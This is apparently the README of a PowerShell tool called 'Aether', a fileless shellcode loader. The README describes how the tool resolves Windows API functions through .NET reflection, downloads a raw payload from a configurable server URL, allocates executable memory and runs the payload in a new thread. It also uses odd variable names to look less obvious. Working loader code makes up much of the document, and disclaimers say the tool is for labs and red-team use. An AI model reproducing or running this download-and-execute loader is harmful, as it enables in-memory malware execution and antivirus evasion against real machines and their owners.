# Aether

Aether is a PowerShell script that uses .NET reflection to call Windows API functions on the fly and run code directly from memory. It’s a practical example of how you can use PowerShell to dynamically load and execute payloads without touching disk.

## What it does

- Finds Windows API functions like `VirtualAlloc` and `CreateThread` by searching through loaded .NET assemblies, not by standard P/Invoke.
- Builds delegates at runtime, allowing managed PowerShell code to call these low-level functions.
- Downloads a binary payload from a URL, puts it in memory, and runs it in a new thread.
- Uses intentionally odd variable names (like “potatoes” and “apples”) to keep things interesting and less obvious at first glance.

## How to use

**Fair Warning:** This script executes arbitrary code and may trigger antivirus or EDR solutions. Use it for learning, research, or red/purple team labs—never on unauthorized systems.

1. Set the `$url` variable in the script to point to your payload (must be a raw binary).
2. Run the script in PowerShell. Admin rights may be needed, depending on what your payload does.

```powershell
$url = "https://your-server.com/payload.bin"   # <--- Change this
# ...rest of the script...
```

## How it works (in plain English)

- **API Lookup:** The function `potatoes` finds the address of Windows API functions (like `VirtualAlloc`) using .NET internals.
- **Delegate Generation:** The function `apples` creates the right .NET delegate type at runtime, matching the function’s signature.
- **Payload Download:** The script grabs your payload from the internet and saves it in a byte array.
- **Memory Allocation:** It uses `VirtualAlloc` to reserve memory with execute permissions.
- **Copy and Go:** The binary is copied into the allocated memory, then a new thread is created at that address.
- **Wait:** The script waits for the thread (your payload) to finish running.

## Example

Here’s a rough step-by-step from the script:

```powershell
$virtualAllocPtr = potatoes kernel32.dll VirtualAlloc
$virtualAllocDelegateType = apples @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])
$virtualAllocDelegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($virtualAllocPtr, $virtualAllocDelegateType)
$mem = $virtualAllocDelegate.Invoke([IntPtr]::Zero, $buf.Length, 0x3000, 0x40)

[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $mem, $buf.Length)

$createThreadPtr = potatoes kernel32.dll CreateThread
$createThreadDelegateType = apples @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
$createThreadDelegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($createThreadPtr, $createThreadDelegateType)
$thread = $createThreadDelegate.Invoke([IntPtr]::Zero, 0, $mem, [IntPtr]::Zero, 0, [IntPtr]::Zero)

$waitForSingleObjectPtr = potatoes kernel32.dll WaitForSingleObject
$waitForSingleObjectDelegateType = apples @([IntPtr], [Int32]) ([Int32])
$waitForSingleObjectDelegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($waitForSingleObjectPtr, $waitForSingleObjectDelegateType)
$waitResult = $waitForSingleObjectDelegate.Invoke($thread, 0xFFFFFFFF)
```

## What’s the point?

Mainly, Aether is for:

- Showing how to use .NET reflection to avoid static API imports.
- Demonstrating in-memory execution of payloads.
- Learning more about Windows internals and PowerShell’s power (and risks).

## License

MIT License.

---

**Disclaimer:**  
This is for educational use only. Don’t use it for anything shady or on machines you don’t have explicit permission to test.
